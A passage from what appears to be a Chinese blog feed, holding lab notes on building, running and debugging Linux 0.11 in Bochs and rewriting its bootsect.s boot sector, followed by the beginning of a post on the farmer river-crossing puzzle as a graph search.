内包含有：</p><ul><li>Bash shell；</li><li>一些基本的 Linux 命令、工具，比如 cp、rm、mv、tar；</li><li>vi 编辑器；</li><li>gcc 1.4 编译器，可用来编译标准 C 程序；</li><li>as86 和 ld86；</li><li>Linux 0.11 的源代码，可在 0.11 下编译，然后覆盖现有的二进制内核。</li></ul><p>除此之外，还需要安装 gcc-3.4。因为Linux-0.11不能在gcc 4.x版本编译，所以要装老一点儿的编译器。</p><p>在Ubuntu 9.04(jaunty)及之前，用下面命令安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install gcc-3.4</span></span><br></pre></td></tr></table></figure><p>在Ubuntu 9.10(karmic)及之后:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -zxvf gcc-3.4-ubuntu.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> gcc-3.4</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ./inst.sh XXX  <span class="comment"># i386 or amd64</span></span></span><br></pre></td></tr></table></figure><blockquote><p>解压gcc-3.4时出现错误：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gzip: stdin: unexpected end of file</span><br><span class="line">tar: Unexpected EOF <span class="keyword">in</span> archive</span><br><span class="line">tar: Unexpected EOF <span class="keyword">in</span> archive</span><br><span class="line">tar: Error is not recoverable: exiting now</span><br></pre></td></tr></table></figure><p>解决方案：</p><ol><li>下载失败，丢失内容：重新下载解压。<br>the error you’re getting is usually due to an incomplete download. The archive ends before the expected footer of the gzipped file. It will probably work fine if you just download it again.</li><li>在windows下解压好后再拖进Ubuntu。</li><li>tar.gz 文件名是否含有非法字符。</li></ol></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><p>课程资料 <a href="https://www.bilibili.com/video/av51437944">操作系统-哈工大李治军老师</a></p></li><li><p><a href="https://github.com/hoverwinter/HIT-OSLab">github实验代码</a></p></li><li><p><a href="https://hoverwinter.gitbooks.io/hit-oslab-manual/content/">哈工大操作系统实验手册</a> (FAQ)</p></li><li><p><a href="https://blog.csdn.net/weixin_43166958/article/details/104223425">徐步小兵的实验总结</a></p></li><li><p>linux-0.11 内核完全注释 v3.0 / linux-0.12 by 赵炯</p></li></ul><p>注：实验中用标记为</p><blockquote></blockquote><p>为过程中出现的问题。</p><h1 id="熟悉实验环境"><a href="#熟悉实验环境" class="headerlink" title="熟悉实验环境"></a>熟悉实验环境</h1><h2 id="1-编译内核"><a href="#1-编译内核" class="headerlink" title="1. 编译内核"></a>1. 编译内核</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ./oslab/linux-0.11/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make all</span></span><br></pre></td></tr></table></figure><p>只要最后没有出现error就说明编译成功。</p><p>linux-0.11目录下是全部的源代码，实验内容靠修改这些代码来完成。修改后需要重新编译内核，还是执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make all</span></span><br></pre></td></tr></table></figure><p>如果重新编译后，你的修改貌似没有生效，可以试试先“make clean”，再“make all”。“make clean”是删除上一次编译生成的所有中间文件和目标文件，确保是在全新的状态下编译整个工程。</p><h2 id="2-运行与调试"><a href="#2-运行与调试" class="headerlink" title="2. 运行与调试"></a>2. 运行与调试</h2><p>在Bochs中运行最新编译好的内核很简单，在oslab目录下执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./run</span></span><br></pre></td></tr></table></figure><p>如果出现Bochs的窗口，里面显示linux的引导过程，最后停止在<code>[/usr/root/]#</code>，表示运行成功。</p><p><img src="/2021/linux0.11-hitlabs/2.png" alt="Bochs"></p><blockquote><p>执行时出现错误：</p><p>./bochs/bochs-gdb: error while loading shared libraries: libSM.so.6: cannot open shared object file: No such file or directory</p><p>解决方案：<a href="https://blog.csdn.net/qq_40758751/article/details/88707214">https://blog.csdn.net/qq_40758751/article/details/88707214</a></p></blockquote><p>内核调试分为两种模式：汇编级调试和 C 语言级调试。</p><h4 id="（1）汇编级调试"><a href="#（1）汇编级调试" class="headerlink" title="（1）汇编级调试"></a>（1）汇编级调试</h4><p>汇编级调试需要执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 确认在 oslab 目录下</span></span><br><span class="line">$ <span class="built_in">cd</span> ~/oslab/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行脚本前确定已经关闭刚刚运行的 Bochs</span></span><br><span class="line">$ ./dbg-asm</span><br></pre></td></tr></table></figure><blockquote><p>汇编级调试的启动之后 Bochs 是黑屏，这是正常的。</p></blockquote><p>可以用命令 <code>help</code> 来查看调试系统用的基本命令。更详细的信息请查阅 Bochs 使用手册。</p><p><img src="https://doc.shiyanlou.com/courses/uid977658-20190618-1560852351872" alt="图片描述"></p><h4 id="（2）C-语言级调试"><a href="#（2）C-语言级调试" class="headerlink" title="（2）C 语言级调试"></a>（2）C 语言级调试</h4><p>C 语言级调试稍微复杂一些。首先执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/oslab</span><br><span class="line">$ ./dbg-c</span><br></pre></td></tr></table></figure><p><strong>然后再打开一个终端窗口</strong>，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/oslab</span><br><span class="line">$ ./rungdb</span><br></pre></td></tr></table></figure><blockquote><p>注意：启动的顺序不能交换，否则 gdb 无法连接。</p></blockquote><p>出现下图所示的提示，才说明连接成功：</p><p><img src="https://doc.shiyanlou.com/courses/uid977658-20190618-1560853330438" alt="图片描述"></p><p>新终端窗口中运行的是 GDB 调试器。关于 gdb 调试器请查阅 GDB 使用手册。</p><h2 id="3-文件交换"><a href="#3-文件交换" class="headerlink" title="3. 文件交换"></a>3. 文件交换</h2><blockquote><p>开始设置文件交换之前，务必关闭所有的 Bochs 进程。</p></blockquote><p>oslab 下的 <code>hdc-0.11-new.img</code> 是 0.11 内核启动后的根文件系统镜像文件，相当于在 bochs 虚拟机里装载的硬盘。在 Ubuntu 上访问其内容的方法是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/oslab/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动挂载脚本</span></span><br><span class="line">$ sudo ./mount-hdc</span><br></pre></td></tr></table></figure><p>之后，hdc 目录下就是和 0.11 内核一模一样的文件系统了，可以读写任何文件（可能有些文件要用 sudo 才能访问）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入挂载到 Ubuntu 上的目录</span></span><br><span class="line">$ <span class="built_in">cd</span> ~/oslab/hdc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看内容</span></span><br><span class="line">$ ls -al</span><br></pre></td></tr></table></figure><p>读写完毕，不要忘了卸载这个文件系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/oslab/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载</span></span><br><span class="line">$ sudo umount hdc</span><br></pre></td></tr></table></figure><p>经过 <code>sudo ./mount-hdc</code> 这样处理以后，我们可以在 Ubuntu 的 hdc 目录下创建一个 xxx.c 文件，然后利用 Ubuntu 上的编辑工具（如 gedit 等）实现对 xxx.c 文件的编辑工作，在编辑保存以后。</p><p>执行 <code>sudo umount hdc</code> 后，再进入 Linux 0.11（即 run 启动 bochs 以后）就会看到这个 xxx.c（即如下图所示），这样就避免了在 Linux 0.11 上进行编辑 xxx.c 的麻烦，因为 Linux 0.11 作为一个很小的操作系统，其上的编辑工具只有 vi，使用起来非常不便。</p><p><img src="https://doc.shiyanlou.com/userid19614labid568time1423993300541" alt="用 Ubuntu 和 Linux 0.11 完成文件交换以后再启动 Linux 0.11 以后"></p><p>另外在 Linux 0.11 上产生的文件，如后面实验中产生的 <code>process.log</code> 文件，可以按这种方式 “放到” Ubuntu 下用 python 程序进行处理，当然这个 python 程序在 Linux 0.11 上显然是不好使的，因为 Linux 0.11 上搭建不了 python 解释环境。</p><blockquote><p>注意 1：不要在 0.11 内核运行的时候 mount 镜像文件，否则可能会损坏文件系统。同理，也不要在已经 mount 的时候运行 0.11 内核。</p><p>注意 2：在关闭 Bochs 之前，需要先在 0.11 的命令行运行 “sync”，确保所有缓存数据都存盘后，再关闭 Bochs。</p></blockquote><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>Q: 为何有时Bochs的光标闪动，却不响应我的输入？</p><p>A: 按一下Alt，然后再试试。 如果你习惯用Alt+Tab切换窗口，就肯定会遇到这个问题。原因是在Bochs窗口按下Alt，Bochs会接收到Alt按下的事件，然后将此事件传给Linux 0.11。待再按下Tab时，主机操作系统经判断认定这是一个切换窗口的快捷键，于是直接切换窗口，Tab和Alt抬起的事件都不会再发给Bochs。等切换会Bochs，Linux 0.11此时还处于认为Alt已按下的状态，再按任何按键都被解释成是和Alt组合的按键，所以就“好像”不响应了（按数字键可以看到它的响应）。</p><p>Q: 怎样加快make clean、make all的速度？</p><p>A: 如果只修改了kernel目录下的文件，删除kernel目录下的kernel.o，然后直接make就行了。其它目录方法类似。</p><p>Q: Bochs屏幕乱了怎么办？</p><p>A: 这是Linux的终端控制和Bochs虚拟的终端之间配合不好导致的，一般在大量输出信息后，会出现混乱，甚至很像死机。此时按ctrl+l可以缓解一下。最好是用输出重定向功能将输出都重定向到一个文件，然后用vi看。</p><h1 id="实验一、操作系统引导"><a href="#实验一、操作系统引导" class="headerlink" title="实验一、操作系统引导"></a>实验一、操作系统引导</h1><h2 id="基本内容"><a href="#基本内容" class="headerlink" title="基本内容"></a>基本内容</h2><ol><li>阅读《Linux内核完全注释》的第6章，对计算机和Linux 0.11的引导过程进行初步的了解；</li><li>按照要求改写0.11的引导程序bootsect.s<ol><li>bootsect.s 能在屏幕上打印一段提示信息“XXX is booting…”，其中 XXX 是你给自己的操作系统起的名字，例如 LZJos、Sunix 等（可以上论坛上秀秀谁的 OS 名字最帅，也可以显示一个特色 logo，以表示自己操作系统的与众不同。）</li></ol></li><li>改写进入保护模式前的设置程序setup.s。<ol><li>bootsect.s 能完成 setup.s 的载入，并跳转到 setup.s 开始地址执行。而 setup.s 向屏幕输出一行”Now we are in SETUP”。</li><li>setup.s 能获取至少一个基本的硬件参数（如内存参数、显卡参数、硬盘参数等），将其存放在内存的特定地址，并输出到屏幕上。</li><li>setup.s 不再加载 Linux 内核，保持上述信息显示在屏幕上即可。</li></ol></li><li>配套李老师课程：L2 L3</li></ol><p>开始实验前，需要了解：</p><p>（1）相关代码文件</p><p>Linux 0.11 文件夹中的 <code>boot/bootsect.s</code>、<code>boot/setup.s</code> 和 <code>tools/build.c</code> 是本实验会涉及到的源文件。它们的功能详见《注释》的 6.2、6.3 节和 16 章。</p><p>（2）引导程序的运行环境</p><p>引导程序由 BIOS 加载并运行。它活动时，操作系统还不存在，整台计算机的所有资源都由它掌控，而能利用的功能只有 BIOS 中断调用。</p><p>实验中主要使用 BIOS 0x10 和 0x13 中断。</p><h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><p>有时，继承传统意味着别手蹩脚。x86 计算机为了向下兼容，导致启动过程比较复杂。请找出 x86 计算机启动过程中，被硬件强制，软件必须遵守的两个“多此一举”的步骤（多找几个也无妨），说说它们为什么多此一举，并设计更简洁的替代方案。</p><p>参考材料：<a href="https://www.wikiwand.com/zh/X86">wiki: x86</a></p><p>x86最先由实模式慢慢发展到保护模式，这中间有过很多为了向下兼容而不得不妥协的作法，比如说为了能访问更多的内存而开启了A20，为了在保护模式下可以运行实模式的程序而设计了v86(虚拟实模式) <a href="https://www.wikiwand.com/zh/%E8%99%9A%E6%8B%9F8086%E6%A8%A1%E5%BC%8F">wiki: 虚拟8086模式</a>等。</p><p>1） 计算机上电，BIOS初始化中断向量表后，会将启动设备的第一个扇区（即引导扇区）读入内存地址0x7c00（31KB)处，并跳转到此处开始执行。而为了方便加载主模块，引导程序首先会将自己移动到内存相对靠后的位置，如linux0.11的bootsect程序先将自己移动到0x90000(576KB)处。这样先移动是多此一举的。</p><ul><li>解决方案：在保证可靠性的前提下尽量扩大实地址模式下BIOS可访问的内存的范围，如引导扇区加载到0x90000等内存高地址处而不是0x7c00。</li></ul><p>2） 计算机上电后，ROM BIOS会在物理内存0处初始化中断向量表，其中有256个中断向量，每个中断向量占用4字节，共1KB，在物理内存地址0x000 - ox3ff处，这些中断向量供BIOS中断使用。这就导致了一个问题，如果操作系统的引导程序在加载操作系统时使用了BIOS中断来获取或者显示一些信息时，这1KB地址不能被覆盖。然而操作系统的主模块为了让其中代码地址等于实际的物理地址，需要将其加载到内存0x0000处。所以操作系统在加载时需要先将主模块加载到内存中不与BIOS中断向量表冲突的地方，之后可以覆盖中断向量表时才将其移动到内存起始处，如Linux0.11的System模块就是在bootsect程序中先加载到0x10000,之后在setup程序中移到0x0000处。 这样先加载到另外地方之后再移动到内存起始位置是多此一举的。</p><ul><li>解决方案：可以将BIOS中断向量表放到实模式下能寻址内存的其他地方，操作系统引导程序直接将操作系统的主模块读到内存的起始处。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200208110055585.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200208110730725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE2Njk1OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="bootsect-s-屏幕输出"><a href="#bootsect-s-屏幕输出" class="headerlink" title="bootsect.s 屏幕输出"></a>bootsect.s 屏幕输出</h2><blockquote><p>代码中以 <code>!</code> 开头的行都是注释，实际在写代码时可以忽略。</p></blockquote><p>首先来看完成屏幕显示的关键代码，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">! 首先读入光标位置</span><br><span class="line">    mov ah,#0x03</span><br><span class="line">    xor bh,bh</span><br><span class="line">    int 0x10</span><br><span class="line"></span><br><span class="line">! 显示字符串 “Hello OS world, my name is LZJ”</span><br><span class="line">! 要显示的字符串长度</span><br><span class="line">    mov cx,#36</span><br><span class="line">    mov bx,#0x0007</span><br><span class="line">    mov bp,#msg1</span><br><span class="line">! es:bp 是显示字符串的地址</span><br><span class="line">! 相比与 linux-0.11 中的代码，需要增加对 es 的处理，因为原代码中在输出之前已经处理了 es</span><br><span class="line">    mov ax,#0x07c0</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov ax,#0x1301</span><br><span class="line">    int 0x10</span><br><span class="line"></span><br><span class="line">! 设置一个无限循环</span><br><span class="line">inf_loop:</span><br><span class="line">    jmp inf_loop</span><br></pre></td></tr></table></figure><p>这里需要修改的是字符串长度，即用需要输出的字符串长度替换 <code>mov cx,#24</code> 中的 24。要注意：除了我们设置的字符串 msg1 之外，还有三个换行 + 回车，一共是 6 个字符。比如这里 <code>Hello OS world, my name is LZJ</code> 的长度是 30，加上 6 后是 36，所以代码应该修改为 <code>mov cx,#36</code>。</p><p>接下来就是修改输出的字符串了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">! msg1 处放置字符串</span><br><span class="line">msg1:</span><br><span class="line">! 换行 + 回车</span><br><span class="line">    .byte   13,10</span><br><span class="line">    .ascii  &quot;Hello OS world, my name is LZJ&quot;</span><br><span class="line">! 两对换行 + 回车</span><br><span class="line">    .byte   13,10,13,10</span><br><span class="line"></span><br><span class="line">! boot_flag 必须在最后两个字节</span><br><span class="line">.org 510</span><br><span class="line">! 设置引导扇区标记 0xAA55</span><br><span class="line">! 必须有它，才能引导</span><br><span class="line">boot_flag:</span><br><span class="line">    .word   0xAA55</span><br></pre></td></tr></table></figure><p>将 <code>.org 508</code> 修改为 <code>.org 510</code>，是因为这里不需要 <code>root_dev: .word ROOT_DEV</code>，为了保证 <code>boot_flag</code> 一定在最后两个字节，所以要修改 <code>.org</code>。</p><p>完整的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">entry _start</span><br><span class="line">_start:</span><br><span class="line">    mov ah,#0x03</span><br><span class="line">    xor bh,bh</span><br><span class="line">    int 0x10</span><br><span class="line">    mov cx,#36</span><br><span class="line">    mov bx,#0x0007</span><br><span class="line">    mov bp,#msg1</span><br><span class="line">    mov ax,#0x07c0</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov ax,#0x1301</span><br><span class="line">    int 0x10</span><br><span class="line">inf_loop:</span><br><span class="line">    jmp inf_loop</span><br><span class="line">msg1:</span><br><span class="line">    .byte   13,10</span><br><span class="line">    .ascii  &quot;Hello OS world, my name is LZJ&quot;</span><br><span class="line">    .byte   13,10,13,10</span><br><span class="line">.org 510</span><br><span class="line">boot_flag:</span><br><span class="line">    .word   0xAA55</span><br></pre></td></tr></table></figure><p>接着执行下面两个命令来编译和链接 bootsect.s。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> as86 -0 -a -o bootsect.o bootsect.s</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ld86 -0 -s -o bootsect bootsect.o</span></span><br></pre></td></tr></table></figure><p>其中 <code>-0</code>（注意：这是数字 0，不是字母 O）表示生成 8086 的 16 位目标程序，<code>-a</code> 表示生成与 GNU as 和 ld 部分兼容的代码，<code>-s</code> 告诉链接器 ld86 去除最后生成的可执行文件中的符号信息。</p><p>如果这两个命令没有任何输出，说明编译与链接都通过了。</p><p>Ubuntu 下用 <code>ls -l</code> 可列出下面的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-rw--x--x    1  root  root  544  Jul  25  15:07   bootsect</span><br><span class="line">-rw------    1  root  root  257  Jul  25  15:07   bootsect.o</span><br><span class="line">-rw------    1  root  root  686  Jul  25  14:28   bootsect.s</span><br></pre></td></tr></table></figure><p>需要留意的文件是 bootsect ，它的大小是 544 字节，而引导程序必须要正好占用一个磁盘扇区，即 512 个字节。造成多了 32 个字节的原因是 ld86 产生的是 Minix 可执行文件格式，这样的可执行文件处理文本段、数据段等部分以外，还包括一个 Minix 可执行文件头部，它的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exec</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> a_magic[<span class="number">2</span>];  <span class="comment">//执行文件魔数</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> a_flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> a_cpu;       <span class="comment">//CPU标识号</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> a_hdrlen;    <span class="comment">//头部长度，32字节或48字节</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> a_unused;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> a_version;</span><br><span class="line">    <span class="keyword">long</span> a_text; <span class="keyword">long</span> a_data; <span class="keyword">long</span> a_bss; <span class="comment">//代码段长度、数据段长度、堆长度</span></span><br><span class="line">    <span class="keyword">long</span> a_entry;    <span class="comment">//执行入口地址</span></span><br><span class="line">    <span class="keyword">long</span> a_total;    <span class="comment">//分配的内存总量</span></span><br><span class="line">    <span class="keyword">long</span> a_syms;     <span class="comment">//符号表大小</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>算一算：6 char（6 字节）+ 1 short（2 字节） + 6 long（24 字节）= 32，正好是 32 个字节，去掉这 32 个字节后就可以放入引导扇区了（这是 <code>tools/build.c</code> 的用途之一）。</p><p>对于上面的 Minix 可执行文件，其 a_magic[0]=0x01，a_magic[1]=0x03，a_flags=0x10（可执行文件），a_cpu=0x04（表示 Intel i8086/8088，如果是 0x17 则表示 Sun 公司的 SPARC），所以 bootsect 文件的头几个字节应该是 01 03 10 04。为了验证一下，Ubuntu 下用命令“hexdump -C bootsect”可以看到：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00000000  01 03 10 04 20 00 00 00  00 02 00 00 00 00 00 00  |.... ...........|</span><br><span class="line">00000010  00 00 00 00 00 00 00 00  00 82 00 00 00 00 00 00  |................|</span><br><span class="line">00000020  b8 c0 07 8e d8 8e c0 b4  03 30 ff cd 10 b9 17 00  |.........0......|</span><br><span class="line">00000030  bb 07 00 bd 3f 00 b8 01  13 cd 10 b8 00 90 8e c0  |....?...........|</span><br><span class="line">00000040  ba 00 00 b9 02 00 bb 00  02 b8 04 02 cd 13 73 0a  |..............s.|</span><br><span class="line">00000050  ba 00 00 b8 00 00 cd 13  eb e1 ea 00 00 20 90 0d  |............. ..|</span><br><span class="line">00000060  0a 53 75 6e 69 78 20 69  73 20 72 75 6e 6e 69 6e  |.Sunix is runnin|</span><br><span class="line">00000070  67 21 0d 0a 0d 0a 00 00  00 00 00 00 00 00 00 00  |g!..............|</span><br><span class="line">00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00000210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 55 aa  |..............U.|</span><br><span class="line">00000220</span><br></pre></td></tr></table></figure><p>接下来干什么呢？是的，要去掉这 32 个字节的文件头部（<code>tools/build.c</code> 的功能之一就是这个）！随手编个小的文件读写程序都可以去掉它。不过，懒且聪明的人会在 Ubuntu 下用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dd bs=1 <span class="keyword">if</span>=bootsect of=Image skip=32</span><br></pre></td></tr></table></figure><p>生成的 Image 就是去掉文件头的 bootsect。</p><p>去掉这 32 个字节后，将生成的文件拷贝到 linux-0.11 目录下，并一定要命名为“Image”（注意大小写）。然后就“run”吧！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当前的工作路径为 .../oslab/linux-0.11/boot/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将刚刚生成的 Image 复制到 linux-0.11 目录下</span></span><br><span class="line">$ cp ./Image ../Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行 oslab 目录中的 run 脚本</span></span><br><span class="line">$ ../../run</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid13labid374time1421133611337" alt="bootsect 引导后的系统启动情况"></p><blockquote><p>run时出错：No bootable device</p><p><img src="C:/Users/fdxr1/AppData/Roaming/Typora/typora-user-images/image-20210419083654490.png"></p></blockquote><h1 id="实验二、"><a href="#实验二、" class="headerlink" title="实验二、"></a>实验二、</h1><p>未完待续。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;哈工大操作系统课程实验记录。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="https://www.fvolcano.red/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="实验" scheme="https://www.fvolcano.red/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>图论-过河问题及其变形</title>
    <link href="https://www.fvolcano.red/2020/Graph-CrossRiver/"/>
    <id>https://www.fvolcano.red/2020/Graph-CrossRiver/</id>
    <published>2020-11-09T13:13:01.000Z</published>
    <updated>2020-11-09T13:13:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>一个农夫带着一头狼、一头羊、一颗白菜过河。他面前只有一条船，只能容纳他和一件物品，只有农夫会划船。如果农夫不在场，狼会吃羊、羊会吃白菜，农夫在场则不会。求将所有物品运到对岸的方案。<a id="more"></a></p><h1 id="图论-安全过河的最短路径问题"><a href="#图论-安全过河的最短路径问题" class="headerlink" title="图论-安全过河的最短路径问题"></a>图论-安全过河的最短路径问题</h1><p><a href="https://www.cnblogs.com/lfri/p/9866992.html">原博客</a></p><h2 id="农夫过河问题"><a href="#农夫过河问题" class="headerlink" title="农夫过河问题"></a>农夫过河问题</h2><p><strong>问题描述</strong></p><p>一个农夫带着一头狼、一头羊、一颗白菜过河。他面前只有一条船，只能容纳他和一件物品，只有农夫会划船。如果农夫不在场，狼会吃羊、羊会吃白菜，农夫在场则不会。求将所有物品运到对岸的方案。</p><p><strong>解题思路</strong></p><p>根据物品的位置定义状态，若在左岸记为1，右岸记为0，于是最终方案就是(1,1,1,1)–&gt;(0,0,0,0)所经过的路径。</p><p>1、定义状态</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028191311144-1211710443.png"><img src="/2020/Graph-CrossRiver/1365470-20181028191311144-1211710443.png"></a></p><p>2、列举所有状态（人、狼、羊、菜）</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028191459048-317298943.png"><img src="/2020/Graph-CrossRiver/1365470-20181028191459048-317298943.png"></a></p><p>3、删除不合理的状态（狼和羊、羊和菜）</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028191647740-1828632698.png"><img src="/2020/Graph-CrossRiver/1365470-20181028191647740-1828632698.png"></a></p><p>4、连边（模拟一次渡河）</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028192013516-1740822628.png"><img src="/2020/Graph-CrossRiver/1365470-20181028192013516-1740822628-1619247456141.png"></a></p><p>5、寻找路径</p><p>寻找(1111)–&gt;(0000)的边，可以用寻路算法如bfs、dfs,如果要求最短路可以用最短路算法如bfs、Dijsktra等，当然这里图很简单，可直接观察出来。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="params">(<span class="number">1111</span>)</span>--&gt;</span><span class="function"><span class="params">(<span class="number">0101</span>)</span>--&gt;</span><span class="function"><span class="params">(<span class="number">1101</span>)</span>--&gt;</span><span class="function"><span class="params">(<span class="number">0001</span>)</span>--&gt;</span><span class="function"><span class="params">(<span 